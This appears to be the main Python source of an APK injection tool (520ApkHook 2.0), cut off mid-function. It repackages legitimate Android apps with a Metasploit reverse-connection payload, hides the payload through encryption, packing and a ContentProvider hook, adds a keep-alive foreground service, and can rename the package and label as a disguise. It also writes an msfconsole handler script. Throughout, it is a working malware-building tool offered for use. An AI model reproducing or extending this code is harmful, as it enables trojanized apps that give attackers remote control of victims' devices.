#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
520ApkHook 2.0 —— 支持 Android 5.0 ~ 17 (API 36/37) 的 APK 注入/整备工具

    python main.py -n 目标.apk --lhost 1.2.3.4 --lport 4444 -m 1
    python main.py -n 目标.apk --analyze          # 只体检，出兼容性报告
    python main.py -n 目标.apk -m 4               # 只整备到 Android 17 可装
    python main.py -n 目标.apk -m 1 --lhost h --lport 4444 \
        --rename-package com.new.pkg --label 新名字   # 注入 + 马甲包

四种模式（1/2/3 沿用 1.x 语义）：
    -m 1  加固 + 注入 payload（原始 dex 全部加密，壳负责解密加载）
    -m 2  只注入 payload（不动原始 dex，不加密，适合已带壳/体积敏感的包）
    -m 3  只加固（当签名/脱壳工具用，不注入 payload）
    -m 4  只整备（不注入不换壳：修 16KB 页对齐 / resources.arsc 对齐 /
          targetSdk / exported，重签成 Android 17 能装的包）

相对 1.1 的关键修复（详见 CHANGELOG.md）：
    * 16KB page size：bundled .so 的 PT_LOAD 重对齐到 0x4000，App 自带 .so 也自动修；
    * resources.arsc / .so 以 STORED + 对齐方式写入（zipalign 语义，纯 Python 实现）；
    * AndroidManifest 改为二进制级编辑（AxmlEdit），不再整份重编码丢资源引用；
    * onCreate 注入指令修正（`invoke-static {p0}, Lx/y/Z;->start(...)V`）并插入到
      .locals/.registers 之后；
    * multidex 编号重排（classes.dex/classes2.dex…）不再互相覆盖；
    * targetSdk 低于 24 自动上调（否则 Android 14/15 直接拒装），>=31 自动补 exported；
    * 全流程 returncode 检查 + report.json 自检报告（对齐/签名/dex 布局/兼容矩阵）。

--------------------------------------------------------------------------------
归属 / Credits
--------------------------------------------------------------------------------
    原始作者   BaoGuo <cleverbao@outlook.com>     2021 年初版 520apkhook
               https://github.com/cleverbao/520apkhook
    2.0+ 维护 huocai250 <1332334007@qq.com>       Android 11~17 适配与重构
               https://github.com/huocai250/apkhook520
    许可证     Apache License 2.0（沿用原作者许可证）

v1.x 的注入思路、壳 dex 与 jni 库均来自原作者 BaoGuo 的开源项目；2.0/2.0 在不
改动原始版权与提交历史的前提下，做了 Android 15/16/17 安装期与运行期适配。
"""

import argparse
import json
import os
import shutil
import sys
import time
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed

if sys.version_info < (3, 8):
    sys.stderr.write('需要 Python 3.8+\n')
    raise SystemExit(1)

from utils import config
from utils.ApkVerifier import Verify, PrintReport
from utils.ApkZipper import ApkZipper, DEFAULT_PAGE_ALIGN, safe_extract
from utils.CreateMsfDex import CreateMsfDex
from utils.CustomPrint import CustomPrint
from utils.ElfAlign import align_dir, PAGE_16K
from utils.EncryptFile import EncryptFile
from utils.InjectMsf2App import InjectMsf2App, InjectError
from utils.ManifestTools import (
    ReadInfo, Patch, Describe, ManifestError, NormalizeClassName,
)
from utils import MultiDex, Tools
from utils import FsSafe
from utils.ProviderInject import BuildKeepAlive, BuildProvider, BuildPayloadLoader
from utils.Tools import ToolError

VERSION = config.VERSION
CODENAME = config.CODENAME
AUTHOR = config.AUTHOR
MAINTAINER = config.MAINTAINER

Print = CustomPrint()

LOGO = r'''
   ___ ____  ____         _    ____  _  _ _____
  | __|___ \|  _ \  __ _ | | _|___ \| || |___ /
  | _|  __) | |_) |/ _` || |/ / __) | || | |_ \
  |_|  / __/|____/ \__,_||_|\_\___/ \__/ ___) |
      ApkHook v%s  (%s)
      original by %s  |  v2.x maintained by %s
''' % (VERSION, CODENAME, AUTHOR, MAINTAINER)

MODES = {
    1: '加固 + 注入 payload',
    2: '只注入 payload',
    3: '只加固（不注入）',
    4: '只整备（不注入不换壳，修 Android 17 兼容性）',
    5: '零改 dex 注入（ContentProvider，不换壳不加密）',
    6: '零改 dex + 加密 payload（assets + 内存 dex 加载）',
}

# 每个模式的「说明书」：装到哪、加不加密、要什么参数、坑在哪。
# 命令行 --mode-help 会整段打印；跑任务时也会把当前模式的关键信息回显一遍。
MODE_HELP = {
    1: {
        'title': '加固 + 注入 payload',
        'shell': True, 'encrypt_dex': True, 'encrypt_payload': True,
        'needs_lport': True, 'min_android': '5.0 (API 21)',
        'works_on': 'Android 5.0 ~ 9（Android 10 及以上隐藏 API 被封，实测必崩）',
        'do': 'Application 换成 SteadyApplication；原 dex 全部 AES 加密进 assets/apkhook/dex/*.bin；'
              '壳在 attachBaseContext 里解包、解密，再反射把 dex 塞进 BaseDexClassLoader。',
        'pro': '加密程度最高，静态看到的是密文 dex + 壳。',
        'con': '塞 dex 依赖隐藏 API（VMRuntime.setHiddenApiExemptions / DexPathList.makePathElements），'
               'Android 10 起这些接口对普通 App 全部 denied（Android 13/17 真机实测），'
               '宿主 dex 加载不进来 → 打开就闪退。',
        'use': '只在 Android 5.0 ~ 9 的老机器上用；Android 10+ 请用 -m 6（零改 dex + 加密 payload）。',
    },
    2: {
        'title': '只注入 payload（不换壳、不加密）',
        'shell': False, 'encrypt_dex': False, 'encrypt_payload': False,
        'needs_lport': True, 'min_android': '5.0 (API 21)',
        'works_on': 'Android 5.0 ~ 17',
        'do': '在原 App 的 Application.onCreate（没有 Application 就找 launcher Activity.onCreate）'
              '插一句 invoke-static 调 guard；payload 编成独立明文 dex 追加。',
        'pro': '不换壳、不用隐藏 API，兼容性比模式 1 好很多；实现最简单，出问题最好排查。',
        'con': 'payload 明文躺在 classesN.dex 里，几乎零隐蔽性；会改动宿主 dex（多一条调用）。',
        'use': '只在旧系统上做验证、或不在乎静态特征时用。',
    },
    3: {
        'title': '只加固（不注入 payload）',
        'shell': True, 'encrypt_dex': True, 'encrypt_payload': False,
        'needs_lport': False, 'min_android': '5.0 (API 21)',
        'works_on': 'Android 5.0 ~ 9（Android 10 及以上同模式 1，隐藏 API 被封）',
        'do': '和模式 1 完全一样的换壳 + dex 加密，但不带 payload。',
        'pro': '可以当「壳功能自检包」：装上去能开就说明壳链路 OK；也可只给 App 加壳。',
        'con': '同模式 1，Android 15+ 隐藏 API 被拦，不可用。',
        'use': '只想加壳/只想验证壳时用。',
    },
    4: {
        'title': '只整备（不注入、不换壳）',
        'shell': False, 'encrypt_dex': False, 'encrypt_payload': False,
        'needs_lport': False, 'min_android': '5.0 (API 21)',
        'works_on': 'Android 5.0 ~ 17',
        'do': '只做安装期合规修复：.so 16KB 页对齐（含 App 自带 4KB 页的）、'
              'resources.arsc STORED+4 字节对齐、targetSdk 抬到 ≥24、targetSdk≥31 补 android:exported、重签。',
        'pro': '最安全：不注入、不换壳、dex 逐字节不变；老包在新系统装不上/一开就崩时的首选。',
        'con': '没有任何注入能力，只是把包修好。',
        'use': '排障第一步：先用它确认「重打包链路没问题」，再上 -m 6。',
    },
    5: {
        'title': '零改 dex 注入（provider 起 payload）',
        'shell': False, 'encrypt_dex': False, 'encrypt_payload': False,
        'needs_lport': True, 'min_android': '5.0 (API 21)',
        'works_on': 'Android 5.0 ~ 17',
        'do': '宿主 dex 一个字节不动；清单里加一个 <provider>，ContentProvider.onCreate() 里'
              '直接调 payload 的 start(Context)（payload 为明文 dex，追加为 classesN.dex）。',
        'pro': '兼容性最好（真机 Android 17 实测通过）；不碰隐藏 API；report 里 host_dex_modified=false。',
        'con': 'payload 明文，静态可见；App 自身的完整性/签名校验仍可能拦。',
        'use': '要注入但不要求加密时；也是排障利器（配 --no-payload-start 只装探针）。',
    },
    6: {
        'title': '零改 dex + 加密 payload（assets + 内存 dex 加载）',
        'shell': False, 'encrypt_dex': False, 'encrypt_payload': True,
        'needs_lport': True, 'min_android': '8.0 (API 26)',
        'works_on': 'Android 8.0 ~ 17',
        'do': 'payload 用 AES/ECB/PKCS7 加密进 assets/apkhook/payload.bin；追加一个明文 wrapper dex'
              '（只含 provider + loader + probe）；运行时 provider → loader → '
              'InMemoryDexClassLoader(allocateDirect) → 反射调 start(Context)。',
        'pro': '既有加密又不碰隐藏 API，Android 15/16/17 可用；宿主 dex 逐字节不变。',
        'con': '需要 minSdk ≥ 26（InMemoryDexClassLoader）；首启多一次读 assets + AES 解密（几十毫秒）。'
               '目标 minSdk < 26 时会自动降级成明文 payload（等同模式 5）。',
        'use': '新机型要加密时的首选（2.0 起的推荐模式）。',
    },
}


# ==========================================================================
# 小工具
# ==========================================================================
def SafeExtractApk(apkpath, destdir):
    """解包 APK，拒绝绝对路径/../ 穿越条目（防止恶意 zip）。"""
    try:
        return safe_extract(apkpath, destdir)
    except RuntimeError as exc:
        raise ToolError(str(exc)) from exc


def BuildHandlerRc(msfpayload, lhost, lport, path):
    """生成 msfconsole 直接可用的 handler 脚本。"""
    lines = [
        'use exploit/multi/handler',
        f'set PAYLOAD {msfpayload}',
        f'set LHOST {lhost}',
        f'set LPORT {lport}',
        'set ExitOnSession false',
        'exploit -j',
        '',
    ]
    os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
    with open(path, 'w', encoding='utf-8', newline='\n') as fp:
        fp.write('\n'.join(lines))
    return path


def DexSlots(apkdir):
    """按 slot 升序返回 dex 的绝对路径列表。"""
    return [os.path.join(apkdir, name) for _slot, name in MultiDex.scan(apkdir)]


def DetectAbis(apkdir):
    """APK 内 lib/ 下实际存在的 ABI 目录。"""
    libdir = os.path.join(apkdir, 'lib')
    if not os.path.isdir(libdir):
        return []
    return [d for d in sorted(os.listdir(libdir))
            if os.path.isdir(os.path.join(libdir, d))]


def DirTree(path, depth=3, prefix=''):
    lines = []
    try:
        entries = sorted(os.listdir(path))
    except OSError:
        return lines
    for i, name in enumerate(entries):
        full = os.path.join(path, name)
        last = i == len(entries) - 1
        lines.append(f"{prefix}{'└── ' if last else '├── '}{name}")
        if os.path.isdir(full) and depth > 1:
            lines += DirTree(full, depth - 1, prefix + ('    ' if last else '│   '))
    return lines


# ==========================================================================
# 主流程
# ==========================================================================
class Hooker:
    def __init__(self, args):
        self.Args = args
        self.Options = dict(config.OPTIONS)
        self.Jobs = max(1, int(getattr(args, 'jobs', 0) or 0)) if getattr(args, 'jobs', 0) \
            else min(4, os.cpu_count() or 1)
        self.DryRun = bool(getattr(args, 'dry_run', False))
        # ---- 模式开关（所有步骤只看这几个布尔，不再散落 mode 判断）----
        mode = args.mode
        self.WantPayload = mode in (1, 2, 5, 6)  # 需要生成并注入 payload
        self.WantShell = mode in (1, 3)         # 换壳（Application 委派 + dex 加密）
        self.EncryptDex = mode in (1, 3)        # dex 是否 AES 加密
        self.RebuildAppDex = False              # 宿主 dex 一律逐字节保留
        self.ProviderMode = mode in (2, 5, 6)      # 用 ContentProvider 起 payload
        self.EncryptPayload = mode == 6         # payload 加密进 assets（内存 dex 加载）
        self.BuildOnly = mode == 4              # 只整备
        self.Report = {
            'tool': f'520ApkHook {VERSION} ({CODENAME})',
            'author': AUTHOR,
            'maintainer': MAINTAINER,
            'project': config.PROJECT_URL,
            'upstream': config.UPSTREAM_URL,
            'license': config.LICENSE_NAME,
            'copyright': config.COPYRIGHT,
            'python': sys.version.split()[0],
            'started_at': time.strftime('%Y-%m-%d %H:%M:%S'),
            'mode': args.mode,
            'mode_name': MODES.get(args.mode, '?'),
            'jobs': self.Jobs,
            'dry_run': self.DryRun,
            'input': os.path.abspath(args.normal_apk),
            'steps': [],
            'warnings': [],
            'errors': [],
        }
        self.Paths = {
            'work': Tools.resolve(self.Options['TestDir']),
            'apkdir': Tools.resolve(self.Options['TestDirUnZipApkPath']),
            'smali': Tools.resolve(self.Options['TestDirAppUnSmaliPath']),
            'msf_smali': Tools.resolve(self.Options['TestDirMsfUnSmaliPath']),
            'payload_smali': Tools.resolve(self.Options['TestDirPayloadSmaliPath']),
            'wrapper_smali': Tools.resolve('WorkDir/dexfile/wrapper'),
            'host_orig': Tools.resolve('WorkDir/dexfile/host_orig'),
            'built': Tools.resolve('WorkDir/dexfile/built'),
            'out_apk': Tools.resolve(args.output or self.Options['ZipFinishApk']),
            'report': Tools.resolve(self.Options['ReportFile']),
            'handler': Tools.resolve(self.Options['MsfHandler']),
        }
        self.ManifestInfo = None
        self.PayloadVars = None
        self.ProviderInfo = None
        self.KeepInfo = None
        self.StrictCompat = bool(getattr(args, 'strict_compat', False))
        # 模式 1/2 会往宿主 dex 里插指令（模式 1 是加密后再插，模式 3 不注入）。
        # 只反编译/回编译「被插指令的那一个 dex」，其余 dex 逐字节保留：
        # 整包 baksmali→smali 会改掉 ktor 之类库的 class/interface 元信息，
        # 真机上表现为 IncompatibleClassChangeError: Found interface ... but class was expected。
        self.NeedAppSmali = False
        self.TargetDexName = None
        self.PayloadLoaderInfo = None
        self.Injected = None
        self.DexBuilt = []       # [(kind, path)] kind in ('app','payload')
        self.Timings = []
        self.LogPath = None
        self.SetupOutputStreams()

    # ------------------------------------------------------------- 基础设施
    def SetupOutputStreams(self):
        """--log 把每条输出同时落盘；--quiet 只保留成功/错误行。"""
        logpath = getattr(self.Args, 'log', None)
        if logpath:
            path = os.path.abspath(logpath)
            os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
            fp = open(path, 'w', encoding='utf-8')
            self.LogPath = path

            def wrap(func, stream=fp):
                def inner(text, *a, **kw):
                    try:
                        stream.write(f'[{time.strftime("%H:%M:%S")}] '
                                     f'{str(text).replace(chr(10), " ")}\n')
                        stream.flush()
                    except Exception:  # noqa: BLE001
                        pass
                    return func(text, *a, **kw)
                return inner

            for name in ('PrintInfo', 'PrintSuccess', 'PrintError', 'PrintRule',
                         'PrintStatus', 'PrintInput', 'PrintLogo'):
                if hasattr(Print, name):
                    setattr(Print, name, wrap(getattr(Print, name)))

        if getattr(self.Args, 'quiet', False):
            Print.PrintInfo = lambda *a, **kw: None

    def Parallel(self, func, items):
        """按 --jobs 并发执行 func(item)，保持输入顺序返回结果。

        并发只用于互相独立的子进程（baksmali/smali/加密），任何异常都会被
        收集后按原顺序抛出，避免出现"部分成功"的糊涂账。
        """
        items = list(items)
        if self.Jobs <= 1 or len(items) <= 1:
            return [func(item) for item in items]
        results = [None] * len(items)
        errors = [None] * len(items)
        with ThreadPoolExecutor(max_workers=min(self.Jobs, len(items))) as pool:
            futures = {pool.submit(func, item): i for i, item in enumerate(items)}
            for future in as_completed(futures):
                index = futures[future]
                try:
                    results[index] = future.result()
                except Exception as exc:  # noqa: BLE001
                    errors[index] = exc
        for exc in errors:
            if exc is not None:
                raise exc
        return results

    def Step(self, title, func, *a, **kw):
        Print.PrintInfo(f'[+] {title}')
        started = time.time()
        result = func(*a, **kw)
        cost = time.time() - started
        self.Timings.append({'step': title, 'seconds': round(cost, 2)})
        self.Report['steps'].append({'step': title, 'seconds': round(cost, 2),
                                     'ok': True})
        Print.PrintSuccess(f'    ok ({cost:.1f}s)')
        return result

    def Fail(self, message, exc=None):
        text = message if exc is None else f'{message}: {exc}'
        Print.PrintError(f'[-] {text}')
        self.Report['errors'].append(text)
        self.Report['steps'].append({'step': 'error', 'message': text, 'ok': False})
        self.WriteReport()
        raise SystemExit(1)

    # ------------------------------------------------------------------ 环境
    def CheckEnvironment(self):
        problems = []
        java = Tools.which_java(self.Args.java)
        self.JavaPath = java
        self.Report['java'] = java
        for name in ('baksmali.jar', 'smali.jar', 'apksigner.jar'):
            path = Tools.jar(name)
            size = os.path.getsize(path)
            if size < 1024:
                problems.append(f'{path} 看起来不是有效 jar（{size} B）')
        for key in ('SteadyDexFile', 'SteadyLibFile', 'MsfBaseDexFile', 'Keystorefile'):
            path = Tools.resolve(self.Options[key])
            if not os.path.exists(path):
                problems.append(f'缺少资源: {path}')
        libdir = Tools.resolve(self.Options['SteadyLibFile'])
        for abi in ('arm64-v8a', 'armeabi-v7a', 'x86', 'x86_64'):
            so = os.path.join(libdir, abi, 'libsteady-lib.so')
            if not os.path.isfile(so):
                problems.append(f'缺少壳库: {so}')
        if not os.path.isfile(self.Args.normal_apk):
            problems.append(f'目标 APK 不存在: {self.Args.normal_apk}')
        if problems:
            self.Fail('环境检查未通过:\n  - ' + '\n  - '.join(problems))
        Print.PrintSuccess(f'    java={java}')
        return True

    # ------------------------------------------------------------------ 准备
    def Prepare(self):
        work = self.Paths['work']
        if os.path.isdir(work) and not self.Args.keep_workdir:
            shutil.rmtree(work, ignore_errors=True)
        for key in ('work', 'apkdir', 'smali', 'msf_smali', 'payload_smali', 'wrapper_smali', 'built'):
            os.makedirs(self.Paths[key], exist_ok=True)

        extracted = SafeExtractApk(self.Args.normal_apk, self.Paths['apkdir'])
        count = extracted['files']
        self.Report['entries'] = count
        self.Report['entries_case_collisions'] = extracted['collisions']
        if extracted['collisions']:
            Print.PrintInfo(
                f'    大小写冲突条目: {extracted["collisions"]} 个'
                '（已隔离到 _apkhook_dup/，打包时还原原文件名）')
        manifest = os.path.join(self.Paths['apkdir'], 'AndroidManifest.xml')
        if not os.path.isfile(manifest):
            self.Fail('APK 内没有 AndroidManifest.xml，不是有效 APK')
        self.ManifestInfo = ReadInfo(manifest)
        _pkg = self.ManifestInfo['package']
        self.Report['manifest_original'] = {
            'package': _pkg,
            'application': NormalizeClassName(_pkg, self.ManifestInfo['application']),
            'launcher_activity': NormalizeClassName(_pkg, self.ManifestInfo['launcher_activity']),
            'target_sdk': self.ManifestInfo['target_sdk'],
            'min_sdk': self.ManifestInfo['min_sdk'],
            'extract_native_libs': self.ManifestInfo['extract_native_libs'],
            'permission_count': len(self.ManifestInfo['permissions']),
            'dexes': [os.path.basename(p) for p in DexSlots(self.Paths['apkdir'])],
            'abis': DetectAbis(self.Paths['apkdir']),
        }
        Print.PrintInfo('    ' + Describe(self.ManifestInfo).replace('\n', '\n    '))

        slots = DexSlots(self.Paths['apkdir'])
        if not slots:
            self.Fail('APK 内没有任何 dex 文件')
        bad = [p for p in slots if not MultiDex.is_dex(p)]
        if bad:
            self.Fail('以下 dex 头部非法（可能已被加固/加密），请先原样脱壳再注入:\n  '
                      + '\n  '.join(os.path.basename(p) for p in bad))
        return count

    # ------------------------------------------------------------------ msf
    def BuildMsf(self):
        if not self.WantPayload:
            Print.PrintInfo(f'    模式 {self.Args.mode} 不注入 payload，跳过')
            return None
        dexfile = Tools.resolve(self.Options['MsfBuildDexFile'])
        os.makedirs(os.path.dirname(dexfile), exist_ok=True)
        CreateMsfDex(
            self.Args.payload, self.Args.lhost, str(self.Args.lport), self.Options
        ).Generate()
        if not os.path.isfile(dexfile):
            self.Fail(f'payload dex 生成失败: {dexfile}')
        BuildHandlerRc(self.Args.payload, self.Args.lhost, self.Args.lport,
                      self.Paths['handler'])
        self.Report['payload'] = {
            'payload': self.Args.payload,
            'lhost': self.Args.lhost,
            'lport': self.Args.lport,
            'dex': os.path.basename(dexfile),
            'handler': self.Paths['handler'],
        }
        return dexfile

    # ---------------------------------------------------------------- 反编译
    def Disassemble(self):
        if not self.NeedAppSmali:
            Print.PrintInfo(f'    模式 {self.Args.mode} 不改宿主 dex：跳过反编译'
                            '（宿主 dex 逐字节保留）')
            self.Report['app_dex_untouched'] = True
            return []
        apkdir = self.Paths['apkdir']
        pkg = self.ManifestInfo['package']
        names = [NormalizeClassName(pkg, self.ManifestInfo.get('application')),
                 NormalizeClassName(pkg, self.ManifestInfo.get('launcher_activity'))]

        # 先在 dex 里按类描述符定位要改的那一个：9 个 dex 的包没必要全反编译，
        # 反编译/回编译次数越多，静态改坏元信息的风险越大。
        target = None
        for cls in [n for n in names if n]:
            desc = ('L' + cls.replace('.', '/') + ';').encode()
            for _slot, dexname in MultiDex.scan(apkdir):
                data = FsSafe.read_bytes(os.path.join(apkdir, dexname))
                if desc in data:
                    target = dexname
                    break
            if target:
                break
        if not target:
            raise ToolError('在 dex 里找不到 Application / 启动 Activity 的类定义，'
                            '无法定位注入点')

        self.TargetDexName = target
        self.Report['app_dex_target'] = target
        stem = os.path.splitext(target)[0]
        outdir = os.path.join(self.Paths['smali'], stem)
        Tools.dex2smali(os.path.join(apkdir, target), outdir, java=self.JavaPath)
        count = sum(len(files) for _d, _s, files in os.walk(outdir))
        Print.PrintInfo(f'    只反编译 {target}（宿主其余 dex 逐字节保留），'
                        f'小文件 {count} 个')
        return [outdir]

    # ------------------------------------------------------------------ 注入
    def InjectPayload(self):
        if not self.WantPayload:
            Print.PrintInfo(f'    模式 {self.Args.mode} 不注入 payload，跳过')
            return None
        if not (self.Args.lhost and self.Args.lport):
            self.Fail(f'模式 {self.Args.mode} 需要 --lhost/--lport')

        msfdex = Tools.resolve(self.Options['MsfBuildDexFile'])
        Tools.dex2smali(msfdex, self.Paths['msf_smali'], java=self.JavaPath)

        injector = InjectMsf2App(self.Options)
        self.PayloadVars = injector.RandomizeMsfSmali(
            self.Paths['msf_smali'], seed=self.Args.seed)

        # payload 单独一个 dex：避免把宿主 dex 撑爆 64K 方法数
        payload_root = self.Paths['payload_smali']
        os.makedirs(payload_root, exist_ok=True)
        injector.InstallPayload(self.Paths['msf_smali'], payload_root, self.PayloadVars)

        if self.ProviderMode:
            return self.InjectViaProvider(payload_root)

        if not self.NeedAppSmali:
            # 模式 1：宿主 dex 一个字节都不动，payload 由壳 reflect 启动
            # （meta-data apkhook_payload 在 PatchManifest 里写入）。
            # 后台保活：保活服务必须能被系统实例化，所以编进**明文** wrapper dex。
            wrap_root = self.Paths['wrapper_smali']
            os.makedirs(wrap_root, exist_ok=True)
            self.KeepInfo = BuildKeepAlive(wrap_root, self.PayloadVars,
                                           seed=self.Args.seed)
            self.Report['keepalive_service'] = self.KeepInfo['class']
            Print.PrintInfo(f"    保活服务: {self.KeepInfo['class']}"
                            "（前台服务，避免后台被冻结）")
            self.Report['inject'] = {
                'strategy': 'shell-reflect',
                'payload_descriptor': self.PayloadVars['descriptor'],
                'guard_descriptor': self.PayloadVars.get('guard_descriptor'),
                'host_dex_modified': False,
                'started_by': 'com.sakuqi.steady.SteadyApplication',
            }
            Print.PrintInfo(f"    payload: {self.PayloadVars['descriptor']}")
            Print.PrintSuccess('    宿主 dex 未改动（由壳反射启动 payload）')
            return self.Report['inject']

        target = injector.ResolveTarget(
            self.Paths['smali'],
            self.ManifestInfo['package'],
            self.ManifestInfo['application'],
            self.ManifestInfo['launcher_activity'],
        )
        result = injector.InjectStart(target['smali_path'], vars=self.PayloadVars)

        self.Injected = result
        self.Report['inject'] = {
            'target_class': target['class'],
            'target_kind': target['kind'],
            'smali': os.path.relpath(target['smali_path'], self.Paths['work']),
            'payload_descriptor': self.PayloadVars['descriptor'],
            'guard_descriptor': self.PayloadVars.get('guard_descriptor'),
            'instruction': result.get('instruction'),
            'changed': result.get('changed'),
            'snippet_before': result.get('before'),
            'snippet_after': result.get('after'),
        }
        Print.PrintInfo(f"    注入点: {target['class']} ({target['kind']})")
        if result.get('changed'):
            Print.PrintSuccess('    已插入 invoke-static')
        else:
            self.Report['warnings'].append('payload 注入未发生变更（可能已注入过）')
        return result

    # --------------------------------------------------- 零改 dex 注入（模式 5/6）
    def InjectViaProvider(self, payload_root):
        """模式 5/6：不改宿主 dex，只加一个 ContentProvider 起 payload。

        模式 6 额外生成一个 Loader（AES 解密 assets/apkhook/payload.bin →
        InMemoryDexClassLoader → 反射调 start），provider 调的是 Loader。
        """
        loader_info = None
        invoke_override = None
        # 模式 6：provider/loader/probe 必须留在**明文** dex 里（系统要实例化 provider），
        # 只有 payload 本体加密进 assets，所以两者写到不同 smali 根目录。
        gen_root = payload_root
        if self.EncryptPayload:
            gen_root = self.Paths['wrapper_smali']
            os.makedirs(gen_root, exist_ok=True)
        if self.EncryptPayload:
            loader_info = BuildPayloadLoader(gen_root, self.PayloadVars,
                                             seed=self.Args.seed)
            self.PayloadLoaderInfo = loader_info
            invoke_override = (f"    invoke-static {{v0}}, {loader_info['descriptor']}"
                               "->run(Landroid/content/Context;)V\n")
            Print.PrintInfo(f"    loader: {loader_info['class']}")
        keep = BuildKeepAlive(gen_root, self.PayloadVars, seed=self.Args.seed)
        self.Report['keepalive_service'] = keep['class']
        Print.PrintInfo(f"    保活服务: {keep['class']}（前台服务，避免后台被冻结）")
        info = BuildProvider(
            gen_root,
            self.ManifestInfo['package'],
            self.PayloadVars,
            seed=self.Args.seed,
            invoke_payload=not getattr(self.Args, 'no_payload_start', False),
            invoke_override=invoke_override,
            start_service=keep['class'],
        )
        info['keep'] = keep
        self.ProviderInfo = info
        self.Report['inject'] = {
            'strategy': ('assets-encrypted-payload' if loader_info
                         else 'content-provider'),
            'provider_class': info['class'],
            'provider_descriptor': info['descriptor'],
            'authorities': info['authorities'],
            'payload_descriptor': self.PayloadVars['descriptor'],
            'guard_descriptor': self.PayloadVars.get('guard_descriptor'),
            'instruction': info['invoke'],
            'host_dex_modified': False,
            'payload_encrypted': self.EncryptPayload,
        }
        if loader_info:
            self.Report['inject']['loader_class'] = loader_info['class']
            self.Report['inject']['loader_descriptor'] = loader_info['descriptor']
            self.Report['inject']['payload_asset'] = 'assets/apkhook/payload.bin'
        Print.PrintInfo(f"    provider: {info['class']}")
        Print.PrintInfo(f"    authorities: {info['authorities']}")
        Print.PrintSuccess('    宿主 dex 未改动（零改 dex 注入）')
        return info

    # ------------------------------------------------------------ 模式兼容自查
    def CheckModeCompat(self):
        """按目标 APK 的 minSdk/targetSdk 检查所选模式能不能用，必要时自动降级。

        这里查的都是「静态就能确定」的事实：
          * 模式 6 的 InMemoryDexClassLoader 要 API 26+，minSdk 太低直接改回明文 payload；
          * 模式 1/3 的壳在 Android 15+ 会被 hidden API 拦，targetSdk 只是提示信号。
        """
        info = self.ManifestInfo or {}
        # 命令行显式指定的 --min-sdk/--target-sdk 会覆盖清单值，兼容判断也要按实际生效值来。
        min_sdk = int(self.Args.min_sdk or info.get('min_sdk') or 0)
        target_sdk = int(self.Args.target_sdk or info.get('target_sdk') or 0)
        notes = []

        if self.ProviderMode and self.EncryptPayload and min_sdk and min_sdk < 26:
            msg = (f'目标 minSdk={min_sdk} < 26，InMemoryDexClassLoader 不可用'
                   f'（模式 6 需要 Android 8.0+）')
            if self.StrictCompat:
                raise ToolError(msg + '；请改用 -m 5，或加 --min-sdk 26 抬高 minSdk')
            self.EncryptPayload = False
            self.Report['payload_encrypted_fallback'] = True
            Print.PrintError('    ' + msg)
            Print.PrintError('    已自动降级：payload 改为明文 dex 追加（等同模式 5，功能不变）')

        if self.WantShell:
            hint = (f'目标 targetSdk={target_sdk}：模式 {self.Args.mode} 的壳要靠隐藏 API 加载'
                    f'（Android 10+ 全部 denied，实测 Android 13/17 必崩；老机器请用 -m 6）'
                    f'解密后的宿主 dex')
            notes.append(hint)
            Print.PrintInfo('    适用机型: Android 5.0 ~ 14')
            Print.PrintError('    提示: 装到 Android 15/16/17 上会因为 hidden API 被拦而闪退；'
                             '新机型请用 -m 6')

        if self.ProviderMode:
            Print.PrintInfo('    适用机型: '
                            + ('Android 8.0 ~ 17' if self.EncryptPayload else 'Android 5.0 ~ 17'))

        if notes:
            self.Report['compat_notes'] = notes
        return notes

    # ---------------------------------------------------------------- 改清单
    def PatchManifest(self):
        path = os.path.join(self.Paths['apkdir'], 'AndroidManifest.xml')
        backup = os.path.join(self.Paths['work'], 'AndroidManifest.original.xml')
        FsSafe.copyfile(path, backup)

        want_shell = self.WantShell
        build_only = self.BuildOnly
        kwargs = {
            # 模式 4 只做兼容性整备：不动权限、不动 extractNativeLibs
            'permissions': (() if build_only else
                            (list(self.Options['UsesPermission']) +
                             list(self.Options.get('KeepAlivePermission', ()))
                             if want_shell
                             else self.Options.get('KeepAlivePermission', ()))),
            'extract_native_libs': None if build_only else True,
        }

        # targetSdk：<24 会被 Android 14/15 拒装，自动上调
        target = self.Args.target_sdk
        if target is None:
            target = self.ManifestInfo['target_sdk'] or self.Options['MinInstallableTargetSdk']
            if target < self.Options['MinInstallableTargetSdk']:
                Print.PrintInfo(
                    f"    targetSdk={target} 过低，上调至 "
                    f"{self.Options['MinInstallableTargetSdk']}（否则 Android 14+ 拒装）")
                target = self.Options['MinInstallableTargetSdk']
        kwargs['target_sdk'] = target
        if self.Args.min_sdk is not None:
            kwargs['min_sdk'] = self.Args.min_sdk

        # 马甲包：改包名（类名会被补全成旧包名的绝对名，指向 dex 里的真实类）
        if getattr(self.Args, 'rename_package', None):
            kwargs['package_name'] = self.Args.rename_package
        if getattr(self.Args, 'label', None):
            kwargs['label'] = self.Args.label
        if getattr(self.Args, 'debuggable', False):
            kwargs['debuggable'] = True
        elif getattr(self.Args, 'no_debuggable', False):
            kwargs['debuggable'] = False

        if want_shell:
            # 注意：这里必须用"原始清单"的包名补全，dex 里的类路径不会随包名变
            original_app = NormalizeClassName(
                self.ManifestInfo['package'],
                self.ManifestInfo['application']) or 'android.app.Application'
            kwargs['application_name'] = self.Options['SteadyLauncherActivity']
            kwargs['meta_data'] = {'app_name': original_app}
            self.Report['shell_application'] = original_app
            # 模式 1：payload 由壳自己反射启动（不注入宿主 dex），
            # 这里把启动类名写进 meta-data 供壳读取。
            if self.WantPayload and self.PayloadVars:
                payload_desc = self.PayloadVars.get('descriptor')
                if payload_desc:
                    payload_dotted = payload_desc.lstrip('L').rstrip(';').replace('/', '.')
                    kwargs['meta_data']['apkhook_payload'] = payload_dotted
                    self.Report['shell_payload'] = payload_dotted
            keep = getattr(self, 'KeepInfo', None)
            if keep:
                kwargs['meta_data']['apkhook_keep'] = keep['class']
                kwargs['service'] = {
                    'name': keep['class'],
                    'exported': False,
                    'foreground_service_type': 1,
                }

        if self.ProviderMode and self.ProviderInfo:
            kwargs['provider'] = {
                'name': self.ProviderInfo['class'],
                'authorities': self.ProviderInfo['authorities'],
                'exported': False,
            }
            keep = self.ProviderInfo.get('keep')
            if keep:
                kwargs['service'] = {
                    'name': keep['class'],
                    'exported': False,
                    # 1 = dataSync；Android 14+ 前台服务必须声明类型
                    'foreground_service_type': 1,
                }

        if target >= 31:
            kwargs['ensure_exported'] = True

        changes = Patch(path, **kwargs)
        self.Report['manifest_patch'] = changes

        if changes.get('package_name'):
            self.Report['warnings'].append(
